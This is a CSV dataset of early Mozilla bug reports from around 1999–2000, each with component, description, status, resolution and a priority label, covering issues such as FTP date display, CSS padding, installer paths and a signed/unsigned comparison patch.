Issue_id,Component,Title,Description,Status,Resolution,Text,Predicted_Priority
28921,Networking,Incorrect Last modified dates showing up in ftp,Going to the above URL in Netscape 4.7 yields (removing file sizes for brevity):; ;   README                Tue Nov 30 04:40:00 1999;   SRPMS/                Mon Dec 13 16:52:00 1999 Directory;   alpha/                Mon Dec 13 16:52:00 1999 Directory;   i386/                 Mon Dec 13 16:52:00 1999 Directory;   ls-lR                 Wed Dec 15 09:02:00 1999;   ls-lR.gz              Wed Dec 15 09:02:00 1999;   powertools/           Fri Dec 11 00:00:00 1998 Directory;   sparc/                Mon Dec 13 16:52:00 1999 Directory; ; Going to the same location in Mozilla gives the following last modified dates; (copying this manually since there doesnt seem to be a way to copy from the; browser):; ;   alpha/                11/29/99 04:16:00 PM;   i386/                 11/29/99 04:16:00 PM;   ls-lR                 11/29/99 08:26:00 AM;   ls-lR.gz              11/29/99 08:26:00 AM;   powertools/           11/28/98 11:24:00 AM;   README                11/29/99 04:04:00 AM;   sparc/                11/29/99 04:16:00 PM;   SRPMS/                11/29/99 04:16:00 PM; ; As you can see; Mozilla is reporting the times incorrectly.,VERIFIED,DUPLICATE,[TITLE] Title: Incorrect Last modified dates showing up in ftp | [DESC] Description: Going to the above URL in Netscape 4.7 yields (removing file sizes for brevity):; ;   README                Tue Nov 30 04:40:00 1999;   SRPMS/                Mon Dec 13 16:52:00 1999 Directory;   alpha/                Mon Dec 13 16:52:00 1999 Directory;   i386/                 Mon Dec 13 16:52:00 1999 Directory;   ls-lR                 Wed Dec 15 09:02:00 1999;   ls-lR.gz              Wed Dec 15 09:02:00 1999;   powertools/           Fri Dec 11 00:00:00 1998 Directory;   sparc/                Mon Dec 13 16:52:00 1999 Directory; ; Going to the same location in Mozilla gives the following last modified dates; (copying this manually since there doesnt seem to be a way to copy from the; browser):; ;   alpha/                11/29/99 04:16:00 PM;   i386/                 11/29/99 04:16:00 PM;   ls-lR                 11/29/99 08:26:00 AM;   ls-lR.gz              11/29/99 08:26:00 AM;   powertools/           11/28/98 11:24:00 AM;   README                11/29/99 04:04:00 AM;   sparc/                11/29/99 04:16:00 PM;   SRPMS/                11/29/99 04:16:00 PM; ; As you can see; Mozilla is reporting the times incorrectly. | [META] Component: Networking | [META] Status: VERIFIED | [META] Resolution: DUPLICATE,2
36905,CSS Parsing and Computation,css1 padding-left adds padding to right even though padding-right is set to 0,Overview Description: ; All of the padding-left widths (em;ex;px;in;cm;mm;pt;& pc) add a width to the ; right padding as well; even though in the test the padding-right is specifically ; set to 0.  The only exception is padding-left using percent; which functions ; correctly.; ; Steps to Reproduce: ; -  Go to this URL:;       http://mozilla.org/quality/browser/standards/css_1/index.html;     (the URL listed in the URL field of this bug is one of these tests); -  Find the section for padding-left (~3/4 down the page); -  Run all the tests for padding-left ; ; Actual Results: ; padding appears on both sides of paragraph; ; Expected Results: ; padding should appear only on the left; ; Build Date & Platform Bug Found: ; 2000-05-02-08-M16 Win98; ; Additional Builds and Platforms Tested On: ; 2000-05-21-20-M16 Mac; Cant get Linux build to run...; Additional Information: ; ; Here is the code for the test at:; http://mozilla.org/quality/browser/standards/css_1/padding_left_em.html; ; <!DOCTYPE HTML PUBLIC -//W3C//DTD HTML 4.0 Transitional//EN>; <html>; <head>; <title>padding_left_em.html</title>; <style type=text/css>;         p.one {;                 border: solid red;;                 padding-top: 0;;                 padding-bottom: 0;;                 padding-right: 0;;                 padding-left: 5em; }; </style>; </head>; <body>; <p class=one>This paragraph block should have a left padding of 5em.; </p>; </body>; </html>,VERIFIED,WORKSFORME,[TITLE] Title: css1 padding-left adds padding to right even though padding-right is set to 0 | [DESC] Description: Overview Description: ; All of the padding-left widths (em;ex;px;in;cm;mm;pt;& pc) add a width to the ; right padding as well; even though in the test the padding-right is specifically ; set to 0.  The only exception is padding-left using percent; which functions ; correctly.; ; Steps to Reproduce: ; -  Go to this URL:;       http://mozilla.org/quality/browser/standards/css_1/index.html;     (the URL listed in the URL field of this bug is one of these tests); -  Find the section for padding-left (~3/4 down the page); -  Run all the tests for padding-left ; ; Actual Results: ; padding appears on both sides of paragraph; ; Expected Results: ; padding should appear only on the left; ; Build Date & Platform Bug Found: ; 2000-05-02-08-M16 Win98; ; Additional Builds and Platforms Tested On: ; 2000-05-21-20-M16 Mac; Cant get Linux build to run...; Additional Information: ; ; Here is the code for the test at:; http://mozilla.org/quality/browser/standards/css_1/padding_left_em.html; ; <!DOCTYPE HTML PUBLIC -//W3C//DTD HTML 4.0 Transitional//EN>; <html>; <head>; <title>padding_left_em.html</title>; <style type=text/css>;         p.one {;                 border: solid red;;                 padding-top: 0;;                 padding-bottom: 0;;                 padding-right: 0;;                 padding-left: 5em; }; </style>; </head>; <body>; <p class=one>This paragraph block should have a left padding of 5em.; </p>; </body>; </html> | [META] Component: CSS Parsing and Computation | [META] Status: VERIFIED | [META] Resolution: WORKSFORME,2
28538,Networking,Unknown content-type dialog thrown when HTTP response doesnt contain a content-type,Overview Description:  When using localhost to view http header info; browser attempts a file download.; ; Steps to Reproduce:; 1.)  Run the local java TestServer app; 2.)  Launch the browser; ; Actual Results:  Browser attempts to download a file; ; Expected Results:  http header should be displayed; ; Build Date & Platform Bug Found:; 1999120708    NT,VERIFIED,DUPLICATE,[TITLE] Title: Unknown content-type dialog thrown when HTTP response doesnt contain a content-type | [DESC] Description: Overview Description:  When using localhost to view http header info; browser attempts a file download.; ; Steps to Reproduce:; 1.)  Run the local java TestServer app; 2.)  Launch the browser; ; Actual Results:  Browser attempts to download a file; ; Expected Results:  http header should be displayed; ; Build Date & Platform Bug Found:; 1999120708    NT | [META] Component: Networking | [META] Status: VERIFIED | [META] Resolution: DUPLICATE,2
36359,HTML: Parser,incorrect type=text/css added to head element,I have a HTML document (attached) with <style type=text/css> inside the <body>; element.; ; When I load and save-as with the composer; the <style> is moved inside <head>; (OK); but the <head> element itself gets an additional type=text/css attribute; (not OK).; ; Tested on windows/linux with nightly build 2000050920.; ; I have set component=Parser; not sure if this is correct.,RESOLVED,WORKSFORME,[TITLE] Title: incorrect type=text/css added to head element | [DESC] Description: I have a HTML document (attached) with <style type=text/css> inside the <body>; element.; ; When I load and save-as with the composer; the <style> is moved inside <head>; (OK); but the <head> element itself gets an additional type=text/css attribute; (not OK).; ; Tested on windows/linux with nightly build 2000050920.; ; I have set component=Parser; not sure if this is correct. | [META] Component: HTML: Parser | [META] Status: RESOLVED | [META] Resolution: WORKSFORME,2
25915,Installer: XPInstall Engine,GetFolder: Installation fails with target folder Preferences,Build: 9/24/99 SeaMonkey build; ; 1. From http://jimbob/trigger2.html; click drop-down button and select;    a_getfolder_2_preferences and click Trigger case button; ; Install.StartInstall(Acceptance: a_getfolder_2_preferences; regName; vi; 0);; f = Install.GetFolder(Preferences; getfolder_preferences);; err = Install.AddSubcomponent(regName; jarSrc; f; jarSrc);; Install.LogComment(AddSubcomponent returns =  + err);; ; RESULT:; From Macintosh; the installation appears fine.  From WinNT; the Install.log; shows:; ; ---------------------------------------------------------------------------; http://jimbob/jars/a_getfolder_2_preferences.jar     --     09/27/1999 12:47:00; ---------------------------------------------------------------------------; ;      Acceptance: a_getfolder_2_preferences; ; ; ** ERROR (-3): Installing: C:\Program Files\moz924\x86rel\00000023C:\Program; Files\Users50\mozProfile\getfolder_preferences\smrtupdt.txt;      ** AddSubcomponent returns = -3; ;      Install script aborted;      Finished Installation  09/27/1999 12:47:01; ; From Linux; the Install.log shows:; ; ---------------------------------------------------------------------------; http://jimbob/jars/a_getfolder_2_preferences.jar     --    09/27/1999 12:46:37; ---------------------------------------------------------------------------; ;      Acceptance: a_getfolder_2_preferences; ; ; ** AddSubcomponent returns = 0; Item[1/1] Replacing:; /u/jimmylee/linux60/sep_24/package/0000001f/u/jimmylee/.mozilla/mozProfile/getfo; lder_preferences/smrtupdt.txt;      Install completed successfully;      Finished Installation  09/27/1999 12:46:38; ; EXPECTED RESULT:; For WinNT; the path to install the file should be:; C:\Program Files\Users50\mozProfile\getfolder_preferences\smrtupdt.txt; ; For Linux; the path to install the file should be:; /u/jimmylee/.mozilla/mozProfile/getfolder_preferences/smrtupdt.txt,VERIFIED,FIXED,[TITLE] Title: GetFolder: Installation fails with target folder Preferences | [DESC] Description: Build: 9/24/99 SeaMonkey build; ; 1. From http://jimbob/trigger2.html; click drop-down button and select;    a_getfolder_2_preferences and click Trigger case button; ; Install.StartInstall(Acceptance: a_getfolder_2_preferences; regName; vi; 0);; f = Install.GetFolder(Preferences; getfolder_preferences);; err = Install.AddSubcomponent(regName; jarSrc; f; jarSrc);; Install.LogComment(AddSubcomponent returns =  + err);; ; RESULT:; From Macintosh; the installation appears fine.  From WinNT; the Install.log; shows:; ; ---------------------------------------------------------------------------; http://jimbob/jars/a_getfolder_2_preferences.jar     --     09/27/1999 12:47:00; ---------------------------------------------------------------------------; ;      Acceptance: a_getfolder_2_preferences; ; ; ** ERROR (-3): Installing: C:\Program Files\moz924\x86rel\00000023C:\Program; Files\Users50\mozProfile\getfolder_preferences\smrtupdt.txt;      ** AddSubcomponent returns = -3; ;      Install script aborted;      Finished Installation  09/27/1999 12:47:01; ; From Linux; the Install.log shows:; ; ---------------------------------------------------------------------------; http://jimbob/jars/a_getfolder_2_preferences.jar     --    09/27/1999 12:46:37; ---------------------------------------------------------------------------; ;      Acceptance: a_getfolder_2_preferences; ; ; ** AddSubcomponent returns = 0; Item[1/1] Replacing:; /u/jimmylee/linux60/sep_24/package/0000001f/u/jimmylee/.mozilla/mozProfile/getfo; lder_preferences/smrtupdt.txt;      Install completed successfully;      Finished Installation  09/27/1999 12:46:38; ; EXPECTED RESULT:; For WinNT; the path to install the file should be:; C:\Program Files\Users50\mozProfile\getfolder_preferences\smrtupdt.txt; ; For Linux; the path to install the file should be:; /u/jimmylee/.mozilla/mozProfile/getfolder_preferences/smrtupdt.txt | [META] Component: Installer: XPInstall Engine | [META] Status: VERIFIED | [META] Resolution: FIXED,2
42487,Editor,On win2K; I dont see an I-Beam cursor at all during editing.,Open new editor window; win2k.; Start typing. Notice the lack of an I-Beam cursor.,VERIFIED,DUPLICATE,[TITLE] Title: On win2K; I dont see an I-Beam cursor at all during editing. | [DESC] Description: Open new editor window; win2k.; Start typing. Notice the lack of an I-Beam cursor. | [META] Component: Editor | [META] Status: VERIFIED | [META] Resolution: DUPLICATE,2
45510,XUL,Crash when entering IMAP password,Mozilla crashes around 50-60% of the time after entering my IMAP password. I; have talkbalk IDs of TB21628622Z; TB21606863Q; and TB21606813E; ; I have mozilla set to fire up the browser and the mail/news client on startup.; ; Im running 2000112108 on Mandrake 7.1,VERIFIED,WORKSFORME,[TITLE] Title: Crash when entering IMAP password | [DESC] Description: Mozilla crashes around 50-60% of the time after entering my IMAP password. I; have talkbalk IDs of TB21628622Z; TB21606863Q; and TB21606813E; ; I have mozilla set to fire up the browser and the mail/news client on startup.; ; Im running 2000112108 on Mandrake 7.1 | [META] Component: XUL | [META] Status: VERIFIED | [META] Resolution: WORKSFORME,2
23373,Layout,Images dont load; alt-text displayed inappropriately,on the left side of this page; I see the text spacer.gif - 46 and other; similar output; part of the document source that is leaking into the content; model.  Will attach test case...,VERIFIED,DUPLICATE,[TITLE] Title: Images dont load; alt-text displayed inappropriately | [DESC] Description: on the left side of this page; I see the text spacer.gif - 46 and other; similar output; part of the document source that is leaking into the content; model.  Will attach test case... | [META] Component: Layout | [META] Status: VERIFIED | [META] Resolution: DUPLICATE,2
46461,Plug-ins,Add intrinsic sizing support for NPAPI,If I embed an Object in a web page; without specifying a width or height size;; the object should appear at its natural size - if it has one.; ; If I embed a audio/wav with no size; I currently get the default 240x200 frame; size; rather than just what is necessary for the [quicktime] audio player; controls.  Web page authors can not be expected to know or specify how much; space the UI for a sound file takes up on arbitrary browsers.  I should be able; to embed a sound without specifying its size; and without getting a large gray; box around a nice and tiny [quicktime] UI.; ; If I embed an SVG file using an Object tag with no size; using Adobe SVG 2.0b4; plugin; I still get the default 240x200 size rather than the inherent/natural; size specified in the SVG file.; ; I am assuming this is a layout problem rather than a plug-in problem; or a; problem with every plugin I have used without explicit sizing.,RESOLVED,WONTFIX,[TITLE] Title: Add intrinsic sizing support for NPAPI | [DESC] Description: If I embed an Object in a web page; without specifying a width or height size;; the object should appear at its natural size - if it has one.; ; If I embed a audio/wav with no size; I currently get the default 240x200 frame; size; rather than just what is necessary for the [quicktime] audio player; controls.  Web page authors can not be expected to know or specify how much; space the UI for a sound file takes up on arbitrary browsers.  I should be able; to embed a sound without specifying its size; and without getting a large gray; box around a nice and tiny [quicktime] UI.; ; If I embed an SVG file using an Object tag with no size; using Adobe SVG 2.0b4; plugin; I still get the default 240x200 size rather than the inherent/natural; size specified in the SVG file.; ; I am assuming this is a layout problem rather than a plug-in problem; or a; problem with every plugin I have used without explicit sizing. | [META] Component: Plug-ins | [META] Status: RESOLVED | [META] Resolution: WONTFIX,3
39137,XML,UTF-8 not correctly handled in XHTML,Mozilla does not automatically switch to UTF-8 for XHTML pages without an XML ; declaration with encoding=utf-8. Meta-elements with charset=utf-8 are ; ignored supposedly since XHTML pages are handled as XML.; ; According to the XML recommendation utf-8 (or utf-16) is the default ; encoding and pages without a declaration of encoding=utf-8 must be handled ; as utf-8 or utf-16 (automatically detected).; ; This worked correctly before. The bug seems to have appeared when the bug was ; fixed that made XHTML pages with an XML declaration not display at all.; ; I have seen this in Mozilla/5.0 (Windows; U; Win98; en-US; m17) ; Gecko/20000713; and two earlier builds.,RESOLVED,WORKSFORME,[TITLE] Title: UTF-8 not correctly handled in XHTML | [DESC] Description: Mozilla does not automatically switch to UTF-8 for XHTML pages without an XML ; declaration with encoding=utf-8. Meta-elements with charset=utf-8 are ; ignored supposedly since XHTML pages are handled as XML.; ; According to the XML recommendation utf-8 (or utf-16) is the default ; encoding and pages without a declaration of encoding=utf-8 must be handled ; as utf-8 or utf-16 (automatically detected).; ; This worked correctly before. The bug seems to have appeared when the bug was ; fixed that made XHTML pages with an XML declaration not display at all.; ; I have seen this in Mozilla/5.0 (Windows; U; Win98; en-US; m17) ; Gecko/20000713; and two earlier builds. | [META] Component: XML | [META] Status: RESOLVED | [META] Resolution: WORKSFORME,3
24712,XUL,[Dogfood] display:none doesnt work on tree control items.,Setting display:none doesnt hide a tree control item.,VERIFIED,NDUPLICATE,[TITLE] Title: [Dogfood] display:none doesnt work on tree control items. | [DESC] Description: Setting display:none doesnt hide a tree control item. | [META] Component: XUL | [META] Status: VERIFIED | [META] Resolution: NDUPLICATE,2
24404,RDF,[PP][CRASH] Windows: Changing Scheme crashes Apprunner,Build ID: 1999070614 (presumably really an August 14; 1999 build); Platform: Windows 98; ; To reproduce:; - Launch apprunner.; - Right-click on the desktop and select Properties.; - In the Appearance pane; change the Scheme to something else (eg Slate).; - Click OK.; ; Result: You crash. If you dont crash; repeat until you do (2-3 times are; usually; necessary).; ; Expected result: You dont crash.; ; The crash is due to an invalid page fault in RDF.DLL. Talkback incident ID is; 12423317.; ; http://cyclone/reports/incidenttemplate.CFM?reportID=124&style=0&tc=3&cp=1&ck1=S; User+email+address&cd1=%25bear%40marmot%2Enet%25&co1=like&bbid=12423317,VERIFIED,WORKSFORME,[TITLE] Title: [PP][CRASH] Windows: Changing Scheme crashes Apprunner | [DESC] Description: Build ID: 1999070614 (presumably really an August 14; 1999 build); Platform: Windows 98; ; To reproduce:; - Launch apprunner.; - Right-click on the desktop and select Properties.; - In the Appearance pane; change the Scheme to something else (eg Slate).; - Click OK.; ; Result: You crash. If you dont crash; repeat until you do (2-3 times are; usually; necessary).; ; Expected result: You dont crash.; ; The crash is due to an invalid page fault in RDF.DLL. Talkback incident ID is; 12423317.; ; http://cyclone/reports/incidenttemplate.CFM?reportID=124&style=0&tc=3&cp=1&ck1=S; User+email+address&cd1=%25bear%40marmot%2Enet%25&co1=like&bbid=12423317 | [META] Component: RDF | [META] Status: VERIFIED | [META] Resolution: WORKSFORME,0
19555,Preferences,no proxy for doesnt work if port information entered,User-Agent:       ; Build Identifier: Mozilla/4.0; ; if you add a ip-range in the no-proxy-for field; like 192.168.0. or 192.168.0.*; it works as expected as long as you dont use something like 192.168.0.122:81 in; this case the proxy is used. if i add 192.168.0.122 to the no-proxy-for field it; works as expected again; ; Reproducible: Always; Steps to Reproduce:; 1. see details; ; Actual Results:  ; Message: Access Denied. (This is OK; because our proxy reject requests to our; internal ips); ; Expected Results:  ; shouldnt use the proxy; ; all said,RESOLVED,FIXED,[TITLE] Title: no proxy for doesnt work if port information entered | [DESC] Description: User-Agent:       ; Build Identifier: Mozilla/4.0; ; if you add a ip-range in the no-proxy-for field; like 192.168.0. or 192.168.0.*; it works as expected as long as you dont use something like 192.168.0.122:81 in; this case the proxy is used. if i add 192.168.0.122 to the no-proxy-for field it; works as expected again; ; Reproducible: Always; Steps to Reproduce:; 1. see details; ; Actual Results:  ; Message: Access Denied. (This is OK; because our proxy reject requests to our; internal ips); ; Expected Results:  ; shouldnt use the proxy; ; all said | [META] Component: Preferences | [META] Status: RESOLVED | [META] Resolution: FIXED,3
36825,Networking,fix signed vs unsigned comparison in,from tinderbox warnings list:; 23.;        netwerk/protocol/http/src/nsHTTPChannel.cpp:2159 (See build log excerpt);        Comparison between signed and unsigned;        2157 PRUint32 count = 0;;        2158 mStreamAsFileObserverArray->Count( & count );;        2159 for ( PRInt32 i=0; i< count; i++ );        2160 {;        2161     mStreamAsFileObserverArray->GetElementAt( i; getter_AddRefs(; observer ) );;    24.;        netwerk/protocol/http/src/nsHTTPChannel.cpp:896 (See build log excerpt);        Comparison between signed and unsigned;        894 PRUint32 count = 0;;        895 mStreamAsFileObserverArray->Count( & count );;        896 for ( PRInt32 i=0; i< count; i++ );        897 {;        898     mStreamAsFileObserverArray->GetElementAt( i; getter_AddRefs(; observer ) );; ; in both cases count is defined as a PRUint32 just before the for loop that; defines i as a PRInt32; ; patch:; diff -u -r1.183 nsHTTPChannel.cpp; --- nsHTTPChannel.cpp	2000/05/17 07:12:37	1.183; +++ nsHTTPChannel.cpp	2000/05/22 02:05:04; @@ -893;7 +893;7 @@;  			nsCOMPtr< nsIStreamAsFileObserver> observer;;  			PRUint32 count = 0;;  			mStreamAsFileObserverArray->Count( & count );; -			for ( PRInt32 i=0; i< count; i++ ); +			for ( PRUint32 i=0; i< count; i++ );  			{;  				mStreamAsFileObserverArray->GetElementAt( i; getter_AddRefs( observer ) );;  				streamAsFile->AddObserver( observer );; @@ -2156;7 +2156;7 @@;  			nsCOMPtr< nsIStreamAsFileObserver> observer;;  			PRUint32 count = 0;;  			mStreamAsFileObserverArray->Count( & count );; -			for ( PRInt32 i=0; i< count; i++ ); +			for ( PRUint32 i=0; i< count; i++ );  			{;  				mStreamAsFileObserverArray->GetElementAt( i; getter_AddRefs( observer ) );;  				streamAsFile->AddObserver( observer );,VERIFIED,FIXED,[TITLE] Title: fix signed vs unsigned comparison in | [DESC] Description: from tinderbox warnings list:; 23.;        netwerk/protocol/http/src/nsHTTPChannel.cpp:2159 (See build log excerpt);        Comparison between signed and unsigned;        2157 PRUint32 count = 0;;        2158 mStreamAsFileObserverArray->Count( & count );;        2159 for ( PRInt32 i=0; i< count; i++ );        2160 {;        2161     mStreamAsFileObserverArray->GetElementAt( i; getter_AddRefs(; observer ) );;    24.;        netwerk/protocol/http/src/nsHTTPChannel.cpp:896 (See build log excerpt);        Comparison between signed and unsigned;        894 PRUint32 count = 0;;        895 mStreamAsFileObserverArray->Count( & count );;        896 for ( PRInt32 i=0; i< count; i++ );        897 {;        898     mStreamAsFileObserverArray->GetElementAt( i; getter_AddRefs(; observer ) );; ; in both cases count is defined as a PRUint32 just before the for loop that; defines i as a PRInt32; ; patch:; diff -u -r1.183 nsHTTPChannel.cpp; --- nsHTTPChannel.cpp	2000/05/17 07:12:37	1.183; +++ nsHTTPChannel.cpp	2000/05/22 02:05:04; @@ -893;7 +893;7 @@;  			nsCOMPtr< nsIStreamAsFileObserver> observer;;  			PRUint32 count = 0;;  			mStreamAsFileObserverArray->Count( & count );; -			for ( PRInt32 i=0; i< count; i++ ); +			for ( PRUint32 i=0; i< count; i++ );  			{;  				mStreamAsFileObserverArray->GetElementAt( i; getter_AddRefs( observer ) );;  				streamAsFile->AddObserver( observer );; @@ -2156;7 +2156;7 @@;  			nsCOMPtr< nsIStreamAsFileObserver> observer;;  			PRUint32 count = 0;;  			mStreamAsFileObserverArray->Count( & count );; -			for ( PRInt32 i=0; i< count; i++ ); +			for ( PRUint32 i=0; i< count; i++ );  			{;  				mStreamAsFileObserverArray->GetElementAt( i; getter_AddRefs( observer ) );;  				streamAsFile->AddObserver( observer ); | [META] Component: Networking | [META] Status: VERIFIED | [META] Resolution: FIXED,0
42895,Security: UI,crash trying to bring up security manager,using 9/27 commercial build (build id 2000092711); running on WinNT; use the menus to select tasks > privacy and security > security manager; lock up every time.  application doesnt actually crash; it just hangs and; becomes non-responsive.  I need to use task manager to kill the process.; happens every time.,VERIFIED,WORKSFORME,[TITLE] Title: crash trying to bring up security manager | [DESC] Description: using 9/27 commercial build (build id 2000092711); running on WinNT; use the menus to select tasks > privacy and security > security manager; lock up every time.  application doesnt actually crash; it just hangs and; becomes non-responsive.  I need to use task manager to kill the process.; happens every time. | [META] Component: Security: UI | [META] Status: VERIFIED | [META] Resolution: WORKSFORME,0
